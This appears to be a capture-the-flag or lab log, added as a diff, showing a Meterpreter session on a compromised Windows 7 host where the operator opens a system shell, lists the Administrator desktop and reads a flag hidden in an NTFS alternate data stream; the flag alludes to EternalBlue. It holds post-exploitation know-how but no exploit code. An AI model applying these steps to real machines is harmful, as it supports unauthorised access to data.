@@ -1,0 +1,32 @@
+[!] Archivo de auditoria confidencial - Protocolo Shadow Brokers
+meterpreter > cat C:/Users/Administrator/Desktop/flag.txt:secret
+flag{3t3rn4l_blu3_sh4d0w_br0k3rs_pwn3d}meterpreter > shell
+Process 1680 created.
+Channel 16 created.
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>cls
+cls
+
+
+C:\Windows\system32>dir "C:\Users\Administrator\Desktop" /a /r
+dir "C:\Users\Administrator\Desktop" /a /r
+ Volume in drive C has no label.
+ Volume Serial Number is D832-C75E
+
+ Directory of C:\Users\Administrator\Desktop
+
+11/05/2026  11:24 PM    <DIR>          .
+11/05/2026  11:24 PM    <DIR>          ..
+11/05/2026  11:24 PM                67 flag.txt
+                                    39 flag.txt:secret:$DATA
+               1 File(s)             67 bytes
+               2 Dir(s)  52,260,872,192 bytes free
+
+C:\Windows\system32>exit
+exit
+meterpreter > cat C:/Users/Administrator/Desktop/flag.txt
+[!] Archivo de auditoria confidencial - Protocolo Shadow Brokers
+meterpreter > cat C:/Users/Administrator/Desktop/flag.txt:secret
+flag{3t3rn4l_blu3_sh4d0w_br0k3rs_pwn3d}meterpreter >
